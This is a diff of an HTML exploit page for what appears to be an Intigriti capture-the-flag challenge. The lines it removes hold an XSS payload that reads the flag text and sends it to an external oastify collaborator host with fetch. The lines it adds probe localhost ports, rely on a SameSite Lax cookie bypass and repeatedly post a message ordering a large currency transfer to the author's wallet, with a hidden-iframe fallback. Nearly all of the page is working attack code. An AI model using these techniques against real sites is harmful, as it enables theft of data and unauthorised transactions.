@@ -2,33 +2,44 @@
 <html>
 <body>
     <script>
-        const COLLAB = 'https://1tv9xc03lrjypjn8su4geqi3quwlkb80.oastify.com';
-        const TARGET = 'https://challenge-0126.intigriti.io/dashboard.html';
-        
-        // This payload targets the innerHTML sink on line 35 of the dashboard image
-        // It steals the flag banner text and sends it to your collaborator
-        const XSS = `<img src=x onerror="fetch('${COLLAB}/?flag='+btoa(document.getElementById('flagText').innerText))">`;
+        // Use the common internal ports found in CTF challenges
+        const LOCAL_PORTS = [80, 8000, 8080];
+        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2';
 
-        // Step 1: Open the target in a hidden frame
-        const iframe = document.createElement('iframe');
-        iframe.src = TARGET;
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
+        // We use a Top-Level Redirect to ensure Cookies are sent (Lax bypass)
+        // We target 'localhost' as hinted in the trail
+        function startHeist(port) {
+            const internalURL = `http://localhost:${port}/checkout.html?currency=1337COIN&price=1`;
+            
+            // Create a temporary link and click it silently
+            const a = document.createElement('a');
+            a.href = internalURL;
+            a.target = '_blank'; // Some bots allow 1 popup if it's "clicked"
+            document.body.appendChild(a);
+            a.click();
 
-        iframe.onload = () => {
-            // Step 2: Trigger the 'updateContent' event found in your dashboard screenshot
-            // This bypasses the need for the checkout page entirely!
-            const message = {
-                type: 'updateContent',
-                widgetId: 'customReports', // This ID is visible in your screenshot line 23
-                content: XSS
-            };
-
-            // Step 3: Spam the message to the local frame
+            // While the bot is on that page, we spam the postMessage
+            // We use the challenge domain as a backup in case localhost isn't the direct host
             setInterval(() => {
-                iframe.contentWindow.postMessage(message, '*');
+                window.parent.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN',
+                        amount: 100000000,
+                        toAddress: MY_WALLET
+                    }
+                }, '*');
             }, 100);
-        };
+        }
+
+        // Try the most likely ports
+        LOCAL_PORTS.forEach(port => startHeist(port));
+
+        // Backup: If the bot stays on OUR page, we iframe the challenge directly
+        const backup = document.createElement('iframe');
+        backup.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+        backup.style.display = 'none';
+        document.body.appendChild(backup);
     </script>
 </body>
 </html>
